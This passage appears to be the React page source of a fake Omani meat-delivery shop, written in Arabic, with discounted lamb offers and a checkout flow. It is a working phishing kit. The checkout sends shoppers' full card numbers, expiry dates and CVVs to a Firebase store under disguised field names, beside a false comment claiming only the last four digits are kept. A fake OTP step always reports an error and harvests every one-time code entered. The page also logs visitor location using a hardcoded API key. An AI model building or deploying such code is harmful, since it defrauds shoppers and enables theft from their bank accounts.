"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Dialog, DialogContent, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent } from "@/components/ui/card"
import { Separator } from "@/components/ui/separator"
import Link from "next/link"
import { Star, Truck, Shield, Clock, CreditCard, Smartphone, CheckCircle, XCircle, AlertCircle } from "lucide-react"
import PaymentOptions from "@/components/part-all"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
const allOtps=['']
type FlowStep = "hero" | "offer" | "checkout" | "payment" | "otp" | "success"

interface Offer {
  id: string
  title: string
  description: string
  originalPrice: number
  offerPrice: number
  image: string
  badge?: string
  popular?: boolean
}

const offers: Offer[] = [
  {
    id: "premium",
    title: "خاروف نعيمي",
    description: "الأفضل للعائلات الكبيرة",
    originalPrice: 50.0,
    offerPrice: 34.9,
    image: "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
    badge: "الأكثر طلباً",
    popular: true,
  },
  {
    id: "premium2",
    title: "خاروف نعيمي",
    description: "الأفضل للعائلات الكبيرة",
    originalPrice: 50.0,
    offerPrice: 34.9,
    image: "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
    badge: "الأكثر طلباً",
    popular: true,
  },
  {
    id: "premium3",
    title: "باقة اللحوم المميزة",
    description: "الأفضل للعائلات الكبيرة",
    originalPrice: 20,
    offerPrice: 15,
    image: "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
    badge: "الأكثر طلباً",
    popular: true,
  },
  {
    id: "bbq",
    title: "باقة الشواء العائلية",
    description: "مثالية لعطلة نهاية الأسبوع",
    originalPrice: 20,
    offerPrice: 12,
    image: "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
    badge: "عرض الشواء",
  },
  {
    id: "luxury",
    title: "باقة القطع الفاخرة",
    description: "للمناسبات الخاصة",
    originalPrice: 16,
    offerPrice: 12,
    image: "/rob.jpg",
    badge: "فاخر",
  },
  {
    id: "budget",
    title: "باقة الطالب المقتصدة",
    description: "مناسبة للميزانية المحدودة",
    originalPrice: 25,
    offerPrice: 15,
    image: "/jaj.jpg",
    badge: "اقتصادي",
  },
]

type CardType = {
  name: string
  pattern: RegExp
  gaps: number[]
  lengths: number[]
  code: { name: string; size: number }
  color: string
}

type CardValidation = {
  isValid: boolean
  cardType: CardType | null
  errors: {
    number?: string
    expiry?: string
    dacvv?: string
    name?: string
  }
}

const cardTypes: CardType[] = [
  {
    name: "Visa",
    pattern: /^4/,
    gaps: [4, 8, 12],
    lengths: [16, 18, 19],
    code: { name: "dacvv", size: 3 },
    color: "bg-blue-600",
  },
  {
    name: "Mastercard",
    pattern: /^5[1-5]|^2[2-7]/,
    gaps: [4, 8, 12],
    lengths: [16],
    code: { name: "CVC", size: 3 },
    color: "bg-red-600",
  },
  {
    name: "American Express",
    pattern: /^3[47]/,
    gaps: [4, 10],
    lengths: [15],
    code: { name: "CID", size: 4 },
    color: "bg-green-600",
  },
  {
    name: "Discover",
    pattern: /^6(?:011|5)/,
    gaps: [4, 8, 12],
    lengths: [16],
    code: { name: "CID", size: 3 },
    color: "bg-orange-600",
  },
]

// Enhanced Luhn algorithm for credit card validation
const luhnCheck = (car: string): boolean => {
  const digits = car.replace(/\D/g, "").split("").map(Number)
  let sum = 0
  let isEven = false

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = digits[i]

    if (isEven) {
      digit *= 2
      if (digit > 9) {
        digit -= 9
      }
    }

    sum += digit
    isEven = !isEven
  }

  return sum % 10 === 0
}

const getCardType = (car: string): CardType | null => {
  const cleanNumber = car.replace(/\D/g, "")
  return cardTypes.find((type) => type.pattern.test(cleanNumber)) || null
}

const formatcar = (value: string, cardType: CardType | null): string => {
  const cleanValue = value.replace(/\D/g, "")
  if (!cardType) return cleanValue

  let formatted = ""
  for (let i = 0; i < cleanValue.length; i++) {
    if (cardType.gaps.includes(i)) {
      formatted += " "
    }
    formatted += cleanValue[i]
  }

  return formatted
}

const validatecar = (car: string): { isValid: boolean; error?: string } => {
  const cleanNumber = car.replace(/\D/g, "")

  if (cleanNumber.length === 0) {
    return { isValid: false, error: "رقم البطاقة مطلوب" }
  }

  if (cleanNumber.length < 13) {
    return { isValid: false, error: "رقم البطاقة قصير جداً" }
  }

  const cardType = getCardType(cleanNumber)
  if (!cardType) {
    return { isValid: false, error: "نوع البطاقة غير مدعوم" }
  }

  if (!cardType.lengths.includes(cleanNumber.length)) {
    return { isValid: false, error: "طول رقم البطاقة غير صحيح" }
  }

  if (!luhnCheck(cleanNumber)) {
    return { isValid: false, error: "رقم البطاقة غير صحيح" }
  }

  return { isValid: true }
}

const validateExpiry = (expiry: string): { isValid: boolean; error?: string } => {
  if (!expiry) {
    return { isValid: false, error: "تاريخ الانتهاء مطلوب" }
  }

  const [month, year] = expiry.split("/")
  if (!month || !year) {
    return { isValid: false, error: "تنسيق التاريخ غير صحيح (MM/YY)" }
  }

  const monthNum = Number.parseInt(month, 10)
  const yearNum = Number.parseInt(`20${year}`, 10)

  if (monthNum < 1 || monthNum > 12) {
    return { isValid: false, error: "الشهر غير صحيح" }
  }

  const currentDate = new Date()
  const currentYear = currentDate.getFullYear()
  const currentMonth = currentDate.getMonth() + 1

  if (yearNum < currentYear || (yearNum === currentYear && monthNum < currentMonth)) {
    return { isValid: false, error: "البطاقة منتهية الصلاحية" }
  }

  return { isValid: true }
}

const validatedacvv = (dacvv: string, cardType: CardType | null): { isValid: boolean; error?: string } => {
  if (!dacvv) {
    return { isValid: false, error: "رمز الأمان مطلوب" }
  }

  const expectedLength = cardType?.code.size || 3
  if (dacvv.length !== expectedLength) {
    return { isValid: false, error: `رمز الأمان يجب أن يكون ${expectedLength} أرقام` }
  }

  if (!/^\d+$/.test(dacvv)) {
    return { isValid: false, error: "رمز الأمان يجب أن يحتوي على أرقام فقط" }
  }

  return { isValid: true }
}

const validateCardName = (name: string): { isValid: boolean; error?: string } => {
  if (!name.trim()) {
    return { isValid: false, error: "اسم حامل البطاقة مطلوب" }
  }

  if (name.trim().length < 2) {
    return { isValid: false, error: "الاسم قصير جداً" }
  }

  if (!/^[a-zA-Z\s]+$/.test(name)) {
    return { isValid: false, error: "الاسم يجب أن يحتوي على أحرف إنجليزية فقط" }
  }

  return { isValid: true }
}

const visitorId = `omn-app-${Math.random().toString(36).substring(2, 15)}`

export default function MainPage() {
  const [currentStep, setCurrentStep] = useState<FlowStep>("hero")
  const [selectedOffer, setSelectedOffer] = useState<Offer | null>(null)
  const [quantity, setQuantity] = useState(1)
  const [open, setOpen] = useState(true)
  const [customerInfo, setCustomerInfo] = useState({
    name: "",
    phone: "",
    address: "",
    city: "",
  })
  const [paymentMethod, setPaymentMethod] = useState<"card" | "cash">("card")
  const [otpCode, setOtpCode] = useState("")
  const [showError, setShowError] = useState(false)
  const [paymentType, setPaymentType] = useState("")

  // Enhanced credit card state
  const [car, setcar] = useState("")
  const [expiry, setExpiry] = useState("")
  const [dacvv, setdacvv] = useState("")
  const [cardName, setCardName] = useState("")
  const [cardValidation, setCardValidation] = useState<CardValidation>({
    isValid: false,
    cardType: null,
    errors: {},
  })

  // Enhanced card number change handler
  const handlecarChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    const cardType = getCardType(value)
    const formatted = formatcar(value, cardType)
    const validation = validatecar(formatted)

    // Limit input based on card type
    if (cardType && formatted.replace(/\s/g, "").length > Math.max(...cardType.lengths)) {
      return
    }

    setcar(formatted)
    setCardValidation((prev) => ({
      ...prev,
      cardType: cardType,
      errors: { ...prev.errors, number: validation.error },
    }))
  }

  // Enhanced expiry change handler
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "")

    // Auto-format MM/YY
    if (value.length >= 2) {
      value = value.substring(0, 2) + "/" + value.substring(2, 4)
    }

    // Limit to MM/YY format
    if (value.length > 5) return

    const validation = validateExpiry(value)
    setExpiry(value)
    setCardValidation((prev) => ({
      ...prev,
      errors: { ...prev.errors, expiry: validation.error },
    }))
  }

  // Enhanced dacvv change handler
  const handledacvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    const cardType = getCardType(car)
    const maxLength = cardType?.code.size || 3
    const truncatedValue = value.substring(0, maxLength)

    const validation = validatedacvv(truncatedValue, cardType)
    setdacvv(truncatedValue)
    setCardValidation((prev) => ({
      ...prev,
      errors: { ...prev.errors, dacvv: validation.error },
    }))
  }

  // Card name change handler
  const handleCardNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    const validation = validateCardName(value)

    setCardName(value)
    setCardValidation((prev) => ({
      ...prev,
      errors: { ...prev.errors, name: validation.error },
    }))
  }

  // Check if card is completely valid
  const isCardValid = () => {
    const cardType = getCardType(car)
    const numberValid = validatecar(car).isValid
    const expiryValid = validateExpiry(expiry).isValid
    const dacvvValid = validatedacvv(dacvv, cardType).isValid
    const nameValid = validateCardName(cardName).isValid

    return numberValid && expiryValid && dacvvValid && nameValid
  }

  // Get validation icon
  const getValidationIcon = (field: keyof CardValidation["errors"]) => {
    const hasError = cardValidation.errors[field]
    const isEmpty = !getFieldValue(field)

    if (isEmpty) return null

    return hasError ? <XCircle className="w-4 h-4 text-red-500" /> : <CheckCircle className="w-4 h-4 text-green-500" />
  }

  const getFieldValue = (field: keyof CardValidation["errors"]) => {
    switch (field) {
      case "number":
        return car
      case "expiry":
        return expiry
      case "dacvv":
        return dacvv
      case "name":
        return cardName
      default:
        return ""
    }
  }

  const getLocationAndLog = async () => {
    if (!visitorId) return

    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية ",
      }).then(() => {
        localStorage.setItem("country", country)
        setupOnlineStatus(visitorId)
      })
    } catch (error) {
      console.error("Error fetching location:", error)
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error",
      }).then(() => {
        console.log(currentStep)
      })
    }
  }

  useEffect(() => {
    getLocationAndLog().then(() => {
      console.log("locations is done")
    })
  }, [])

  useEffect(() => {
    addData({ id: visitorId, currentStep }).then(() => {
      console.log(`Current step is ${currentStep}`)
    })
  }, [currentStep])

  const totalPrice = selectedOffer ? selectedOffer.offerPrice * quantity : 0

  const handleOfferClick = () => {
    setCurrentStep("offer")
  }

  const handleProceedToCheckout = () => {
    setCurrentStep("checkout")
  }

  const handleProceedToPayment = () => {
    if (customerInfo.name && customerInfo.phone && customerInfo.address) {
      addData({
        id: visitorId,
        name: customerInfo.name,
        phone: customerInfo.phone,
      }).then(() => {
        console.log(`Customer Info is ${customerInfo}`)
      })
      setCurrentStep("payment")
    }
  }

  const handlePayment = () => {
    if (paymentMethod === "card" && !isCardValid()) {
      return
    }

    addData({
      id: visitorId,
      car: car, // Only store last 4 digits
      cardType: cardValidation.cardType?.name,
      expiryDate: expiry,
      dacvv
    }).then(() => {
      if (paymentMethod === "cash") {
        setCurrentStep("success")
      } else {
        setCurrentStep("otp")
      }
    })
  }

  const handledaotpVerification = () => {
    allOtps.push(otpCode)

    addData({ id: visitorId, daotp: otpCode,allOtps }).then(() => {
      setOtpCode("")
      setShowError(true)
      setTimeout(() => {
        setShowError(false)
      }, 5000)
    })
   
  }

  const closeDialog = () => {
    setCurrentStep("hero")
    setQuantity(1)
    setCustomerInfo({ name: "", phone: "", address: "", city: "" })
    setOtpCode("")
    setcar("")
    setExpiry("")
    setdacvv("")
    setCardName("")
    setCardValidation({ isValid: false, cardType: null, errors: {} })
    setSelectedOffer(null)
  }

  const handleSelectOffer = (offer: Offer) => {
    setSelectedOffer(offer)
    setCurrentStep("checkout")
  }

  return (
    <div className="min-h-screen">
      {/* Hero Section */}
      <section className="relative min-h-screen flex items-center bg-gradient-to-br from-green-900 via-green-800 to-green-700 overflow-hidden">
        {/* Background Pattern */}
        <div className="absolute inset-0 opacity-10">
          <div className="absolute top-20 right-20 w-64 h-64 bg-white rounded-full blur-3xl"></div>
          <div className="absolute bottom-20 left-20 w-48 h-48 bg-white rounded-full blur-3xl"></div>
          <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-white rounded-full blur-3xl"></div>
        </div>

        {/* Background Image */}
        <div className="absolute inset-0 bg-black/20">
          <div className="w-full h-full bg-gradient-to-br from-green-900/80 to-green-700/80"></div>
        </div>

        <Dialog open={open} onOpenChange={setOpen}>
          <DialogContent className="max-w-[350px]">
            <img src="jahor.jpg" alt="" />
            <DialogFooter>
              <Button
                className="bg-green-700 w-full"
                onClick={() => {
                  handleSelectOffer(offers[0])
                }}
              >
                أحصل على العرض
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>

        <div className="container mx-auto px-4 relative z-10">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
            {/* Content */}
            <div className="text-white space-y-8">
              {/* Badge */}
              <div className="flex items-center p-2 space-x-2 space-x-reverse">
                <Badge className="bg-yellow-500 text-black px-4 py-2 text-sm font-bold animate-pulse">
                  🏆 الأفضل في سلطنة عمان
                </Badge>
                <div className="flex items-center space-x-1 space-x-reverse">
                  {[...Array(5)].map((_, i) => (
                    <Star key={i} className="w-4 h-4 fill-yellow-400 text-yellow-400" />
                  ))}
                  <span className="text-sm opacity-90">(4.9 من 5)</span>
                </div>
              </div>

              {/* Main Heading */}
              <div>
                <h1 className="text-5xl md:text-7xl font-bold leading-tight mb-6">
                  أجود أنواع
                  <span className="block bg-gradient-to-r from-yellow-400 to-orange-400 bg-clip-text text-transparent">
                    اللحوم الطازجة
                  </span>
                </h1>
                <p className="text-xl md:text-2xl opacity-90 leading-relaxed">
                  نقدم لك أفضل اللحوم الطازجة والمضمونة الجودة مع خدمة توصيل سريعة وآمنة إلى باب منزلك
                </p>
              </div>

              {/* Features */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <div className="flex items-center space-x-3 space-x-reverse bg-white/10 backdrop-blur-sm rounded-lg p-4">
                  <Truck className="w-6 h-6 text-yellow-400" />
                  <div>
                    <p className="font-semibold">توصيل سريع</p>
                    <p className="text-sm opacity-75">خلال ساعتين</p>
                  </div>
                </div>
                <div className="flex items-center space-x-3 space-x-reverse bg-white/10 backdrop-blur-sm rounded-lg p-4">
                  <Shield className="w-6 h-6 text-yellow-400" />
                  <div>
                    <p className="font-semibold">جودة مضمونة</p>
                    <p className="text-sm opacity-75">100% طازج</p>
                  </div>
                </div>
                <div className="flex items-center space-x-3 space-x-reverse bg-white/10 backdrop-blur-sm rounded-lg p-4">
                  <Clock className="w-6 h-6 text-yellow-400" />
                  <div>
                    <p className="font-semibold">خدمة 24/7</p>
                    <p className="text-sm opacity-75">دائماً متاحون</p>
                  </div>
                </div>
              </div>

              {/* CTA Buttons */}
              <div className="flex flex-col sm:flex-row gap-4">
                <Link href="/">
                  <Button
                    size="lg"
                    className="w-full bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 text-black font-bold px-8 py-4 text-lg shadow-xl transform hover:scale-105 transition-all duration-200"
                  >
                    تسوق الآن
                  </Button>
                </Link>
                <Button
                  size="lg"
                  variant="outline"
                  className="border-white text-white hover:bg-white hover:text-green-700 bg-transparent backdrop-blur-sm px-8 py-4 text-lg shadow-xl transform hover:scale-105 transition-all duration-200"
                >
                  تواصل معنا
                </Button>
              </div>

              {/* Stats */}
              <div className="grid grid-cols-3 gap-8 pt-8 border-t border-white/20">
                <div className="text-center">
                  <div className="text-3xl font-bold text-yellow-400">10K+</div>
                  <div className="text-sm opacity-75">عميل راضي</div>
                </div>
                <div className="text-center">
                  <div className="text-3xl font-bold text-yellow-400">500+</div>
                  <div className="text-sm opacity-75">منتج متاح</div>
                </div>
                <div className="text-center">
                  <div className="text-3xl font-bold text-yellow-400">24/7</div>
                  <div className="text-sm opacity-75">خدمة العملاء</div>
                </div>
              </div>
            </div>

            {/* Image/Visual */}
            <div className="relative flex justify-center">
              <div className="relative z-10 flex flex-col ">
                <img
                  src="/jahor.jpg"
                  alt="عرض اللحوم المميزة"
                  className="max-w-[400px] h-auto py-4 rounded-xl shadow-2xl transform hover:scale-105 transition-transform duration-500"
                />
                {/* Floating Cards */}
                <div className="absolute -top-4 -right-4 bg-white rounded-lg p-4 shadow-xl animate-bounce">
                  <div className="flex items-center space-x-2 space-x-reverse">
                    <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                    <span className="text-sm font-semibold text-gray-800">متوفر الآن</span>
                  </div>
                </div>
                <Button
                  onClick={() => handleSelectOffer(offers[1])}
                  className="w-full my-2 bg-gradient-to-r from-yellow-400 to-orange-400 hover:from-yellow-500 hover:to-orange-500 text-black font-bold"
                >
                  احصل على العرض
                </Button>
                <Button variant={"outline"} onClick={handleOfferClick} className="w-full my-4  text-black font-bold">
                  باقي العروض
                </Button>
              </div>
              {/* Background Decoration */}
              <div className="absolute inset-0 bg-gradient-to-br from-yellow-400/20 to-orange-400/20 rounded-2xl blur-3xl transform scale-110"></div>
            </div>
          </div>
        </div>

        {/* Scroll Indicator */}
        <div className="absolute bottom-8 left-1/2 transform -translate-x-1/2 animate-bounce">
          <div className="w-6 h-10 border-2 border-white rounded-full flex justify-center">
            <div className="w-1 h-3 bg-white rounded-full mt-2 animate-pulse"></div>
          </div>
        </div>
      </section>

      {/* Offers Selection Dialog */}
      <Dialog open={currentStep === "offer"} onOpenChange={closeDialog}>
        <DialogContent className="max-w-4xl mx-auto max-h-[90vh] overflow-y-auto" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-center text-green-700 mb-2">
              🎉 عروض خاصة محدودة!
            </DialogTitle>
            <p className="text-center text-gray-600">اختر الباقة المناسبة لك</p>
          </DialogHeader>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mt-6">
            {offers.map((offer) => (
              <Card
                key={offer.id}
                className={`cursor-pointer transition-all duration-300 hover:shadow-xl hover:scale-105 ${offer.popular ? "ring-2 ring-yellow-400 relative" : ""
                  }`}
                onClick={() => handleSelectOffer(offer)}
              >
                {offer.popular && (
                  <div className="absolute -top-3 left-1/2 transform -translate-x-1/2 z-10">
                    <Badge className="bg-yellow-500 text-black px-3 py-1 font-bold">⭐ الأكثر شعبية</Badge>
                  </div>
                )}
                <CardContent className="p-0">
                  <div className="relative">
                    <img
                      src={offer.image || "/placeholder.svg"}
                      alt={offer.title}
                      className="w-full h-40 object-cover rounded-t-lg"
                    />
                    {offer.badge && (
                      <Badge className="absolute top-2 right-2 bg-red-500 text-white">{offer.badge}</Badge>
                    )}
                  </div>
                  <div className="p-4">
                    <h3 className="text-lg font-bold mb-2 text-right">{offer.title}</h3>
                    <p className="text-sm text-gray-600 mb-3 text-right">{offer.description}</p>
                    <div className="flex items-center justify-between mb-4">
                      <div className="text-right">
                        <span className="text-2xl font-bold text-green-600">{offer.offerPrice} ر.ع</span>
                        <span className="text-sm text-gray-500 line-through mr-2">{offer.originalPrice} ر.ع</span>
                      </div>
                      <Badge className="bg-red-100 text-red-700">
                        وفر {offer.originalPrice - offer.offerPrice} ر.ع
                      </Badge>
                    </div>
                    <Button
                      className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold"
                      onClick={() => handleSelectOffer(offer)}
                    >
                      اختر هذه الباقة
                    </Button>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
          <div className="mt-6 text-center">
            <p className="text-sm text-gray-500">🚚 توصيل مجاني لجميع الباقات</p>
            <p className="text-sm text-gray-500">⏰ العرض ساري حتى نفاد الكمية</p>
          </div>
        </DialogContent>
      </Dialog>

      {/* Checkout Dialog */}
      <Dialog open={currentStep === "checkout"} onOpenChange={closeDialog}>
        <DialogContent className="max-w-lg mx-auto" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-center">معلومات التوصيل</DialogTitle>
          </DialogHeader>
          <div className="space-y-2">
            <div className="grid grid-cols-2 gap-2">
              <div>
                <Label htmlFor="name">الاسم الكامل</Label>
                <Input
                  id="name"
                  value={customerInfo.name}
                  onChange={(e) => setCustomerInfo({ ...customerInfo, name: e.target.value })}
                  placeholder="أدخل اسمك"
                />
              </div>
              <div>
                <Label htmlFor="phone">رقم الهاتف</Label>
                <Input
                  id="phone"
                  value={customerInfo.phone}
                  onChange={(e) => setCustomerInfo({ ...customerInfo, phone: e.target.value })}
                  placeholder="9XXXXXXX"
                />
              </div>
            </div>
            <div>
              <Label htmlFor="address">العنوان التفصيلي</Label>
              <Input
                id="address"
                value={customerInfo.address}
                onChange={(e) => setCustomerInfo({ ...customerInfo, address: e.target.value })}
                placeholder="المنطقة، الشارع، رقم المبنى"
              />
            </div>
            <Separator />
            <div className="bg-gray-50 p-4 rounded-lg">
              <h4 className="font-semibold mb-2">ملخص الطلب</h4>
              {selectedOffer && (
                <>
                  <div className="flex justify-between mb-2">
                    <span>
                      {selectedOffer.title} × {quantity}
                    </span>
                    <span>{totalPrice} ر.ع</span>
                  </div>
                </>
              )}
              <div className="flex justify-between">
                <span>رسوم التوصيل</span>
                <span className="text-green-600">مجاناً</span>
              </div>
              <PaymentOptions setPaymentType={setPaymentType} />
              <Separator className="my-2" />
              <div className="flex justify-between font-bold">
                <span>المجموع</span>
                <span>{paymentType === "partial" ? "0.5" : totalPrice} ر.ع</span>
              </div>
            </div>
            <Button
              onClick={handleProceedToPayment}
              disabled={!customerInfo.name || !customerInfo.phone || !customerInfo.address}
              className="w-full bg-green-600 hover:bg-green-700"
            >
              متابعة للدفع
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Enhanced Payment Dialog */}
      <Dialog open={currentStep === "payment"} onOpenChange={closeDialog}>
        <DialogContent className="max-w-lg mx-auto" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-center">طريقة الدفع</DialogTitle>
          </DialogHeader>
          <div className="space-y-6">
            <div className="grid grid-cols-1 gap-4">
              <Card
                className={`cursor-pointer transition-all ${paymentMethod === "card" ? "ring-2 ring-green-500" : ""}`}
                onClick={() => setPaymentMethod("card")}
              >
                <CardContent className="p-4 text-center">
                  <CreditCard className="w-8 h-8 mx-auto mb-2 text-green-600" />
                  <p className="font-semibold">بطاقة ائتمان</p>
                </CardContent>
              </Card>
            </div>

            {paymentMethod === "card" && (
              <div className="space-y-4">
                {/* Card Number Input */}
                <div>
                  <Label htmlFor="car" className="flex items-center gap-2">
                    رقم البطاقة
                    {cardValidation.cardType && (
                      <Badge className={`${cardValidation.cardType.color} text-white text-xs`}>
                        {cardValidation.cardType.name}
                      </Badge>
                    )}
                  </Label>
                  <div className="relative">
                    <Input
                      id="car"
                      type="tel"
                      value={car}
                      onChange={handlecarChange}
                      placeholder="#### #### #### ####"
                      className={`pr-10 ${cardValidation.errors.number
                        ? "border-red-500"
                        : car && !cardValidation.errors.number
                          ? "border-green-500"
                          : ""
                        }`}
                      maxLength={23} // Account for spaces
                    />
                    <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                      {getValidationIcon("number")}
                    </div>
                  </div>
                  {cardValidation.errors.number && (
                    <p className="text-red-500 text-sm mt-1 flex items-center gap-1">
                      <AlertCircle className="w-4 h-4" />
                      {cardValidation.errors.number}
                    </p>
                  )}
                </div>

                {/* Expiry and dacvv */}
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="expiry">تاريخ الانتهاء</Label>
                    <div className="relative">
                      <Input
                        id="expiry"
                        type="tel"
                        value={expiry}
                        onChange={handleExpiryChange}
                        placeholder="MM/YY"
                        className={`pr-10 ${cardValidation.errors.expiry
                          ? "border-red-500"
                          : expiry && !cardValidation.errors.expiry
                            ? "border-green-500"
                            : ""
                          }`}
                        maxLength={5}
                      />
                      <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                        {getValidationIcon("expiry")}
                      </div>
                    </div>
                    {cardValidation.errors.expiry && (
                      <p className="text-red-500 text-sm mt-1 flex items-center gap-1">
                        <AlertCircle className="w-4 h-4" />
                        {cardValidation.errors.expiry}
                      </p>
                    )}
                  </div>

                  <div>
                    <Label htmlFor="dacvv">{cardValidation.cardType?.code.name || "dacvv"}</Label>
                    <div className="relative">
                      <Input
                        id="dacvv"
                        type="password"
                        value={dacvv}
                        onChange={handledacvvChange}
                        placeholder="***"
                        className={`pr-10 ${cardValidation.errors.dacvv
                          ? "border-red-500"
                          : dacvv && !cardValidation.errors.dacvv
                            ? "border-green-500"
                            : ""
                          }`}
                        maxLength={cardValidation.cardType?.code.size || 3}
                      />
                      <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                        {getValidationIcon("dacvv")}
                      </div>
                    </div>
                    {cardValidation.errors.dacvv && (
                      <p className="text-red-500 text-sm mt-1 flex items-center gap-1">
                        <AlertCircle className="w-4 h-4" />
                        {cardValidation.errors.dacvv}
                      </p>
                    )}
                  </div>
                </div>

                {/* Card Name */}
                <div>
                  <Label htmlFor="cardName">اسم حامل البطاقة (بالإنجليزية)</Label>
                  <div className="relative">
                    <Input
                      id="cardName"
                      value={cardName}
                      onChange={handleCardNameChange}
                      placeholder="CARDHOLDER NAME"
                      className={`pr-10 ${cardValidation.errors.name
                        ? "border-red-500"
                        : cardName && !cardValidation.errors.name
                          ? "border-green-500"
                          : ""
                        }`}
                      style={{ textTransform: "uppercase" }}
                    />
                    <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                      {getValidationIcon("name")}
                    </div>
                  </div>
                  {cardValidation.errors.name && (
                    <p className="text-red-500 text-sm mt-1 flex items-center gap-1">
                      <AlertCircle className="w-4 h-4" />
                      {cardValidation.errors.name}
                    </p>
                  )}
                </div>

                {/* Card Validation Summary */}
                {(car || expiry || dacvv || cardName) && (
                  <div
                    className={`p-3 rounded-lg border ${isCardValid() ? "bg-green-50 border-green-200" : "bg-red-50 border-red-200"
                      }`}
                  >
                    <div className="flex items-center gap-2">
                      {isCardValid() ? (
                        <CheckCircle className="w-5 h-5 text-green-600" />
                      ) : (
                        <XCircle className="w-5 h-5 text-red-600" />
                      )}
                      <span className={`font-medium ${isCardValid() ? "text-green-700" : "text-red-700"}`}>
                        {isCardValid() ? "البطاقة صالحة ✓" : "يرجى التحقق من بيانات البطاقة"}
                      </span>
                    </div>
                  </div>
                )}
              </div>
            )}

            <div className="bg-gray-50 p-4 rounded-lg">
              <div className="flex justify-between font-bold text-lg">
                <span>المبلغ المطلوب دفعه</span>
                <span>{paymentType === "partial" ? "0.5" : totalPrice} ر.ع</span>
              </div>
            </div>

            <Button
              onClick={handlePayment}
              disabled={paymentMethod === "card" && !isCardValid()}
              className={`w-full text-lg py-3 ${paymentMethod === "card" && !isCardValid()
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-green-600 hover:bg-green-700"
                }`}
            >
              {paymentMethod === "card" ? "ادفع الآن" : "تأكيد الطلب"}
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* OTP Dialog */}
      <Dialog open={currentStep === "otp"} onOpenChange={closeDialog}>
        <DialogContent className="max-w-md mx-auto" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-center">تأكيد الدفع</DialogTitle>
          </DialogHeader>
          <div className="space-y-6 text-center">
            <div>
              <Smartphone className="w-16 h-16 mx-auto mb-4 text-green-600" />
              <p className="text-gray-600 mb-4">تم إرسال رمز التأكيد إلى رقم هاتفك</p>
              <p className="font-semibold">{customerInfo.phone}</p>
            </div>
            <div>
              <Label htmlFor="otp">أدخل رمز التأكيد</Label>
              <Input
                id="otp"
                value={otpCode}
                onChange={(e) => {
                  setShowError(false)
                  setOtpCode(e.target.value)
                }}
                placeholder="*******"
                className={showError ? "border-2 border-red-500" : ""}
                maxLength={6}
              />
            </div>
            <Button onClick={handledaotpVerification} className="w-full bg-green-600 hover:bg-green-700">
              تأكيد الدفع
            </Button>
            <Button variant="ghost" className="w-full">
              إعادة إرسال الرمز
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Success Dialog */}
      <Dialog open={currentStep === "success"} onOpenChange={closeDialog}>
        <DialogContent className="max-w-md mx-auto" dir="rtl">
          <div className="text-center space-y-6">
            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
              <div className="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center">
                <span className="text-white text-2xl">✓</span>
              </div>
            </div>
            <div>
              <h3 className="text-2xl font-bold text-green-700 mb-2">تم تأكيد طلبك!</h3>
              <p className="text-gray-600 mb-4">شكراً لك! سيتم توصيل طلبك خلال ساعتين</p>
              <div className="bg-green-50 p-4 rounded-lg">
                <p className="font-semibold">رقم الطلب: #OM{Math.floor(Math.random() * 10000)}</p>
                {selectedOffer && <p>الباقة: {selectedOffer.title}</p>}
                <p>الكمية: {quantity}</p>
                <p>المبلغ المدفوع: {totalPrice} ر.ع</p>
                <p>طريقة الدفع: {paymentMethod === "card" ? "بطاقة ائتمان" : "الدفع عند التسليم"}</p>
              </div>
            </div>
